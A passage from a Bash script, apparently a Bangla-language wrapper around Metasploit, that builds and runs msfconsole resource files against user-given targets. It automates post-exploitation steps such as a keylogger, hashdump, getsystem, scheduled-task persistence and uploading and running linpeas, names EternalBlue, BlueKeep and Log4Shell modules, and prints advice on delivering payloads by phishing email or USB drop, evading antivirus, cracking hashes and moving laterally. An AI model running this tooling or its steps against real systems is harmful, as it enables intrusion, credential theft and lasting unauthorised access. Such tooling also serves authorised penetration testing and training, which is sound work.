            echo "run post/multi/manage/system_time" >> "$rc_file"
            post_desc="sysinfo"
            ;;
        3) echo "getuid" >> "$rc_file"; post_desc="getuid" ;;
        4) echo "getsystem" >> "$rc_file"; post_desc="getsystem" ;;
        5) echo "screenshot" >> "$rc_file"; post_desc="screenshot" ;;
        6)
            echo "keyscan_start" >> "$rc_file"
            echo -e "${YELLOW}[*] 30 সেকেন্ড পর keyscan_dump দিয়ে capture দেখুন।${NC}"
            post_desc="keylogger"
            ;;
        7)
            read -p "$(echo -e ${WHITE}"Remote file path: "${NC})" rfile
            echo "download $rfile" >> "$rc_file"
            post_desc="download"
            ;;
        8)
            read -p "$(echo -e ${WHITE}"Local file path: "${NC})" lfile
            read -p "$(echo -e ${WHITE}"Remote destination: "${NC})" rdest
            echo "upload $lfile $rdest" >> "$rc_file"
            post_desc="upload"
            ;;
        9)
            read -p "$(echo -e ${WHITE}"Local port: "${NC})" lp
            read -p "$(echo -e ${WHITE}"Remote host: "${NC})" rh
            read -p "$(echo -e ${WHITE}"Remote port: "${NC})" rp
            echo "portfwd add -l $lp -p $rp -r $rh" >> "$rc_file"
            post_desc="portfwd"
            ;;
        10)
            echo "upload /usr/share/peass/linpeas/linpeas.sh /tmp/linpeas.sh" >> "$rc_file"
            echo "execute -f /bin/bash -a '-c chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'" >> "$rc_file"
            post_desc="linpeas"
            ;;
        11)
            echo "run post/windows/manage/persistence_exe STARTUP=SCHEDULER" >> "$rc_file"
            post_desc="persistence"
            ;;
        12)
            echo "sysinfo" >> "$rc_file"
            echo "getuid" >> "$rc_file"
            echo "hashdump" >> "$rc_file"
            echo "run post/multi/recon/local_exploit_suggester" >> "$rc_file"
            post_desc="full_recon"
            ;;
    esac

    USE_CASE_DATA="post|$post_desc|session_$session_id"
    RC_FILE_PATH="$rc_file"
}

# ================================================================
# USE CASE 5 — DIRECT MSF CONSOLE
# ================================================================
usecase_console() {
    local target=$1

    echo ""
    echo -e "${RED}${BOLD}━━━ Use Case 5: Direct MSF Console ━━━${NC}"
    echo ""
    echo -e "  ${CYAN}${BOLD}Useful MSF Commands (hint):${NC}"
    echo ""
    echo -e "  ${WHITE}search <term>${NC}          — Module search করুন"
    echo -e "  ${WHITE}use <module>${NC}           — Module load করুন"
    echo -e "  ${WHITE}show options${NC}           — Options দেখুন"
    echo -e "  ${WHITE}set RHOSTS $target${NC}     — Target set করুন"
    echo -e "  ${WHITE}set PAYLOAD <payload>${NC}  — Payload set করুন"
    echo -e "  ${WHITE}show payloads${NC}          — Available payloads দেখুন"
    echo -e "  ${WHITE}run / exploit${NC}          — Run করুন"
    echo -e "  ${WHITE}sessions -l${NC}            — Active sessions দেখুন"
    echo -e "  ${WHITE}sessions -i <id>${NC}       — Session এ enter করুন"
    echo -e "  ${WHITE}back${NC}                   — Module থেকে বের হন"
    echo -e "  ${WHITE}exit${NC}                   — msfconsole বন্ধ করুন"
    echo ""
    echo -e "  ${YELLOW}${BOLD}Common Exploits:${NC}"
    echo -e "  ${DIM}EternalBlue (MS17-010): exploit/windows/smb/ms17_010_eternalblue${NC}"
    echo -e "  ${DIM}BlueKeep (CVE-2019):    exploit/windows/rdp/cve_2019_0708_bluekeep${NC}"
    echo -e "  ${DIM}Shellshock:             exploit/multi/http/apache_mod_cgi_bash_env_exec${NC}"
    echo -e "  ${DIM}Log4Shell:              exploit/multi/misc/log4shell_header_injection${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] msfconsole খুলবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    # Set RHOSTS automatically
    local rc_tmp
    rc_tmp=$(mktemp --suffix=.rc)
    echo "setg RHOSTS $target" > "$rc_tmp"
    echo "echo '[*] RHOSTS set to: $target'" >> "$rc_tmp"

    USE_CASE_DATA="console|direct|$target"
    RC_FILE_PATH="$rc_tmp"
}

# ================================================================
# RUN MSF
# ================================================================
run_msf() {
    local use_case=$1

    if [ -z "$RC_FILE_PATH" ]; then
        echo -e "${YELLOW}[!] RC file নেই।${NC}"
        return
    fi

    echo ""
    echo -e "${CYAN}[*] RC Script preview:${NC}"
    echo -e "${DIM}─────────────────────────────────${NC}"
    cat "$RC_FILE_PATH" | sed 's/^/  /'
    echo -e "${DIM}─────────────────────────────────${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] msfconsole চালাবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    echo ""
    echo -e "${RED}${BOLD}[*] msfconsole শুরু হচ্ছে...${NC}"
    echo -e "${DIM}(msfconsole বন্ধ করতে 'exit' টাইপ করুন)${NC}"
    echo ""
    sleep 1

    msfconsole -r "$RC_FILE_PATH" 2>&1 | tee "$SCAN_TMP"
}

# ================================================================
# BANGLA ANALYSIS
# ================================================================
bangla_analysis() {
    local outfile=$1
    local report_file=$2
    local use_case_data=$3

    {
    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║           বাংলায় Metasploit রিপোর্ট বিশ্লেষণ                     ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local critical=0 high=0 medium=0 info=0
    local uc_type
    uc_type=$(echo "$use_case_data" | cut -d'|' -f1)

    case $uc_type in
        exploit)
            local module
            module=$(echo "$use_case_data" | cut -d'|' -f2)
            local payload
            payload=$(echo "$use_case_data" | cut -d'|' -f3)

            # Session opened?
            if grep -qi "Meterpreter session\|Command shell session\|session.*opened" "$outfile" 2>/dev/null; then
                critical=$((critical+1))
                echo -e "  ${RED}${BOLD}🚨 SESSION OPENED! Target compromised!${NC}"
                echo -e "     ${WHITE}→ Exploit সফল হয়েছে। Target system এ access পাওয়া গেছে।${NC}"
                echo -e "     ${WHITE}→ এখন post exploitation করতে পারো।${NC}"
                echo -e "     ${WHITE}→ sessions -l দিয়ে session দেখো।${NC}"
                echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
            elif grep -qi "Exploit completed.*no session\|exploit.*failed\|\[-\]" "$outfile" 2>/dev/null; then
                info=$((info+1))
                echo -e "  ${YELLOW}[!] Exploit সফল হয়নি।${NC}"
                echo -e "     ${WHITE}→ Target patched থাকতে পারে অথবা wrong module।${NC}"
                echo -e "     ${WHITE}→ অন্য payload বা module দিয়ে চেষ্টা করুন।${NC}"
                echo -e "     ${WHITE}→ SearchSploit দিয়ে alternative exploit খুঁজুন।${NC}"
                echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""
            fi

            # Module analysis
            info=$((info+1))
            echo -e "  ${GREEN}${BOLD}✅ Exploit Summary:${NC}"
            echo -e "     ${WHITE}→ Module  : $module${NC}"
            echo -e "     ${WHITE}→ Payload : $payload${NC}"

            # Explain common exploits
            if echo "$module" | grep -qi "ms17_010\|eternalblue"; then
                high=$((high+1))
                echo ""
                echo -e "  ${YELLOW}${BOLD}⚠ EternalBlue (MS17-010) Analysis:${NC}"
                echo -e "     ${WHITE}→ এটি WannaCry ransomware এ ব্যবহৃত exploit।${NC}"
                echo -e "     ${WHITE}→ Windows SMB service এর critical vulnerability।${NC}"
                echo -e "     ${WHITE}→ Unpatched Windows 7/Server 2008 এ কাজ করে।${NC}"
                echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
            elif echo "$module" | grep -qi "bluekeep\|cve_2019_0708"; then
                high=$((high+1))
                echo ""
                echo -e "  ${YELLOW}${BOLD}⚠ BlueKeep (CVE-2019-0708) Analysis:${NC}"
                echo -e "     ${WHITE}→ Windows RDP service এর wormable vulnerability।${NC}"
                echo -e "     ${WHITE}→ Authentication ছাড়াই remote code execution।${NC}"
                echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
            elif echo "$module" | grep -qi "log4shell\|log4j"; then
                critical=$((critical+1))
                echo ""
                echo -e "  ${RED}${BOLD}🚨 Log4Shell (CVE-2021-44228) Analysis:${NC}"
                echo -e "     ${WHITE}→ Java Log4j library এর critical RCE vulnerability।${NC}"
                echo -e "     ${WHITE}→ CVSS Score: 10.0 — সর্বোচ্চ severity।${NC}"
                echo -e "     ${WHITE}→ Log4j 2.0-2.14.1 affected।${NC}"
                echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
            fi
            ;;

        auxiliary)
            local module
            module=$(echo "$use_case_data" | cut -d'|' -f2)

            # MS17-010 vulnerable?
            if grep -qi "MS17-010\|VULNERABLE\|is vulnerable" "$outfile" 2>/dev/null; then
                critical=$((critical+1))
                echo -e "  ${RED}${BOLD}🚨 Vulnerable System পাওয়া গেছে!${NC}"
                echo -e "     ${WHITE}→ Target EternalBlue attack এর জন্য vulnerable।${NC}"
                echo -e "     ${WHITE}→ Use Case 1 দিয়ে exploit করুন।${NC}"
                echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
            fi

            # Anonymous FTP
            if grep -qi "Anonymous.*success\|Login.*anonymous" "$outfile" 2>/dev/null; then
                high=$((high+1))
                echo -e "  ${YELLOW}${BOLD}⚠ Anonymous FTP Access!${NC}"
                echo -e "     ${WHITE}→ FTP তে anonymous login কাজ করছে।${NC}"
                echo -e "     ${WHITE}→ Sensitive files access হতে পারে।${NC}"
                echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
            fi

            # Open ports found
            local port_count
            port_count=$(grep -c "open\|Open" "$outfile" 2>/dev/null || echo 0)
            if [ "$port_count" -gt 0 ]; then
                info=$((info+1))
                echo -e "  ${GREEN}${BOLD}✅ Scanner Results:${NC}"
                echo -e "     ${WHITE}→ Module: $module${NC}"
                echo -e "     ${WHITE}→ $port_count টি result পাওয়া গেছে।${NC}"
                echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""
            fi
            ;;

        payload)
            local pl lh lp outf
            pl=$(echo "$use_case_data"   | cut -d'|' -f2)
            lh=$(echo "$use_case_data"   | cut -d'|' -f3)
            lp=$(echo "$use_case_data"   | cut -d'|' -f4)
            outf=$(echo "$use_case_data" | cut -d'|' -f5)

            info=$((info+1))
            echo -e "  ${GREEN}${BOLD}✅ Payload Generation Summary:${NC}"
            echo -e "     ${WHITE}→ Payload : $pl${NC}"
            echo -e "     ${WHITE}→ LHOST   : $lh (তোমার machine)${NC}"
            echo -e "     ${WHITE}→ LPORT   : $lp${NC}"
            echo -e "     ${WHITE}→ Output  : $outf${NC}"
            echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""

            medium=$((medium+1))
            echo -e "  ${CYAN}${BOLD}ℹ Payload Delivery Tips:${NC}"
            echo -e "     ${WHITE}→ Payload target machine এ পৌঁছানোর উপায়:${NC}"
            echo -e "     ${WHITE}   • Social engineering (email attachment)${NC}"
            echo -e "     ${WHITE}   • Web server এ upload${NC}"
            echo -e "     ${WHITE}   • USB drop${NC}"
            echo -e "     ${WHITE}→ AV bypass এর জন্য encoder ব্যবহার করো।${NC}"
            echo -e "     ${WHITE}→ Listener: multi/handler দিয়ে connection ধরো।${NC}"
            echo -e "     ${CYAN}→ ঝুঁকি: MEDIUM${NC}"; echo ""
            ;;

        post)
            local post_mod
            post_mod=$(echo "$use_case_data" | cut -d'|' -f2)

            if grep -qi "hashdump\|NTLM\|LM:" "$outfile" 2>/dev/null; then
                critical=$((critical+1))
                echo -e "  ${RED}${BOLD}🚨 Password Hashes পাওয়া গেছে!${NC}"
                echo -e "     ${WHITE}→ hashdump সফল — NTLM hash collect হয়েছে।${NC}"
                echo -e "     ${WHITE}→ John the Ripper বা Hashcat দিয়ে crack করুন।${NC}"
                echo -e "     ${WHITE}→ Pass-the-Hash attack ও সম্ভব।${NC}"
                echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
            fi

            if grep -qi "getsystem.*success\|Got system\|elevated" "$outfile" 2>/dev/null; then
                critical=$((critical+1))
                echo -e "  ${RED}${BOLD}🚨 Privilege Escalation সফল!${NC}"
                echo -e "     ${WHITE}→ SYSTEM/root access পাওয়া গেছে।${NC}"
                echo -e "     ${WHITE}→ Full system control এখন possible।${NC}"
                echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
            fi

            info=$((info+1))
            echo -e "  ${GREEN}${BOLD}✅ Post Exploitation: $post_mod${NC}"
            echo -e "     ${WHITE}→ Session এ successfully commands পাঠানো হয়েছে।${NC}"
            echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""
            ;;

        console)
            info=$((info+1))
            echo -e "  ${GREEN}${BOLD}✅ Direct MSF Console session শেষ।${NC}"
            echo -e "     ${WHITE}→ Manual exploitation করা হয়েছে।${NC}"
            echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""
            ;;
    esac

    # Risk summary
    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo -e "  ${WHITE}   Info/Low : $info টি${NC}"
    echo ""

    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — এখনই পদক্ষেপ নিন!${NC}"
    elif [ "$high" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}  সার্বিক ঝুঁকি : ███████░░░ HIGH — দ্রুত মনোযোগ দেওয়া দরকার।${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — কিছু জিনিস ঠিক করা দরকার।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — স্পষ্ট vulnerability নেই।${NC}"
    fi
    echo ""
    } | tee "$report_file"
}

# ================================================================
# NEXT TOOL SUGGESTION
# ================================================================
suggest_next_tool() {
    local outfile=$1
    local use_case_data=$2
    local target=$3
    local uc_type
    uc_type=$(echo "$use_case_data" | cut -d'|' -f1)

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║              পরবর্তী Scan এর সাজেশন                                ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    case $uc_type in
        exploit)
            if grep -qi "session.*opened\|Meterpreter" "$outfile" 2>/dev/null; then
                echo -e "  ${RED}${BOLD}🔓 LinPEAS / WinPEAS${NC} — Privilege Escalation"
                echo -e "     ${WHITE}কারণ: Session পাওয়া গেছে — privilege escalation check করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: Metasploit Use Case 4 → LinPEAS run${NC}"; echo ""

                echo -e "  ${YELLOW}${BOLD}🔑 John the Ripper${NC} — Hash Cracking"
                echo -e "     ${WHITE}কারণ: Session থেকে hashdump করে hash crack করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt${NC}"; echo ""
            fi
            if grep -qi "smb\|445" "$outfile" 2>/dev/null; then
                echo -e "  ${MAGENTA}${BOLD}💻 CrackMapExec${NC} — SMB Lateral Movement"
                echo -e "     ${WHITE}কারণ: SMB exploit হয়েছে — network এ lateral movement করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: crackmapexec smb $target -u admin -p password${NC}"; echo ""
            fi
            ;;
        auxiliary)
            echo -e "  ${RED}${BOLD}💥 Metasploit Exploit${NC} — Found vulnerability exploit করুন"
            echo -e "     ${WHITE}কারণ: Scanner result দেখে exploit চালান।${NC}"
            echo -e "     ${CYAN}কমান্ড: Metasploit Use Case 1 ব্যবহার করুন${NC}"; echo ""

            echo -e "  ${YELLOW}${BOLD}🔍 SearchSploit${NC} — Exploit Database search"
            echo -e "     ${WHITE}কারণ: পাওয়া service version এর জন্য exploit খুঁজুন।${NC}"
            echo -e "     ${CYAN}কমান্ড: searchsploit <service_name> <version>${NC}"; echo ""
            ;;
        payload)
            echo -e "  ${GREEN}${BOLD}🎯 Metasploit Handler${NC} — Connection ধরুন"
            echo -e "     ${WHITE}কারণ: Payload deliver করার পর listener setup করুন।${NC}"
            echo -e "     ${CYAN}কমান্ড: Metasploit Use Case 1 → multi/handler${NC}"; echo ""
            ;;
        post)
            echo -e "  ${RED}${BOLD}🔑 John / Hashcat${NC} — Hash Cracking"
            echo -e "     ${WHITE}কারণ: Collected hashes crack করুন।${NC}"
            echo -e "     ${CYAN}কমান্ড: john --wordlist=rockyou.txt hashes.txt${NC}"; echo ""

            echo -e "  ${CYAN}${BOLD}🏢 BloodHound${NC} — AD Attack Path (Windows network এ)"
            echo -e "     ${WHITE}কারণ: Domain environment এ attack path visualize করুন।${NC}"
            echo -e "     ${CYAN}কমান্ড: bloodhound-python -u user -p pass -d domain.local${NC}"; echo ""
            ;;
    esac

    echo -e "  ${WHITE}${BOLD}📡 Nmap${NC} — Service version deep scan"
    echo -e "     ${WHITE}কারণ: Open ports এর exact version জানুন।${NC}"
    echo -e "     ${CYAN}কমান্ড: nmap -sV -sC -p- $target${NC}"; echo ""
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local target=$1
    local scan_out=$2
    local bangla_out=$3
    local use_case=$4
    local ts=$5

    echo ""
    read -p "$(echo -e ${YELLOW}"[?] Result save করবেন? (y/n): "${NC})" sc
    if [[ "$sc" =~ ^[Yy]$ ]]; then
        local safe
        safe=$(echo "$target" | sed 's/[^a-zA-Z0-9._-]/_/g')
        local fname="$RESULTS_DIR/msf_${use_case}_${safe}_${ts}.txt"
        {
            echo "============================================================"
            echo "  METASPLOIT RESULTS  —  SAIMUM's Automation Tool"
            echo "  Use Case : $use_case"
            echo "  Target   : $target"
            echo "  Date     : $(date)"
            echo "============================================================"
            echo ""
            echo "=== RC SCRIPT ==="
            [ -n "$RC_FILE_PATH" ] && cat "$RC_FILE_PATH" || echo "(msfvenom direct / console)"
            echo ""
            echo "=== MSF OUTPUT ==="
            cat "$scan_out"
            echo ""
            echo "=== BANGLA ANALYSIS ==="
            sed 's/\x1b\[[0-9;]*m//g' "$bangla_out"
        } > "$fname"
        echo -e "${GREEN}[✓] Saved → $fname${NC}"
        echo "$(date) | $use_case | $target | $fname" >> "$HISTORY_FILE"
    fi
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    # Root check (metasploit needs root for some modules)
    if [ "$EUID" -ne 0 ]; then
        echo -e "${YELLOW}[!] Warning: কিছু Metasploit module root দরকার।${NC}"
        echo -e "${DIM}sudo ./metasploit_saimum.sh দিয়ে চালানো ভালো।${NC}"
        echo ""
    fi

    while true; do
        get_targets

        for t in "${TARGETS[@]}"; do
            pre_scan_recon "$t"
        done

        read -p "[Enter] চাপুন use case select করতে..."

        show_usecase_menu
        read -p "$(echo -e ${YELLOW}"[?] Use Case select করুন [0-5]: "${NC})" uc_choice

        if [ "$uc_choice" = "0" ]; then
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        fi

        for t in "${TARGETS[@]}"; do
            echo ""
            echo -e "${RED}${BOLD}══════════════ Target: $t ══════════════${NC}"

            local ts
            ts=$(date +%Y%m%d_%H%M%S)
            SCAN_TMP=$(mktemp)
            local tmp_bangla
            tmp_bangla=$(mktemp)
            USE_CASE_DATA=""
            RC_FILE_PATH=""

            case $uc_choice in
                1) usecase_exploit  "$t" "$ts" ;;
                2) usecase_auxiliary "$t" "$ts" ;;
                3) usecase_payload  "$ts" ;;
                4) usecase_post     "$t" "$ts" ;;
                5) usecase_console  "$t" ;;
                *) echo -e "${RED}[!] Invalid।${NC}"; continue ;;
            esac

            # Run msfconsole (not for payload case which runs directly)
            if [ "$uc_choice" != "3" ]; then
                run_msf "$uc_choice"
            fi

            bangla_analysis "$SCAN_TMP" "$tmp_bangla" "$USE_CASE_DATA"
            suggest_next_tool "$SCAN_TMP" "$USE_CASE_DATA" "$t"
            save_results "$t" "$SCAN_TMP" "$tmp_bangla" "$uc_choice" "$ts"

            rm -f "$SCAN_TMP" "$tmp_bangla"
        done

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি scan করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        unset TARGETS USE_CASE_DATA RC_FILE_PATH SCAN_TMP LHOST_VAL LPORT_VAL
        show_banner
    done
}

main
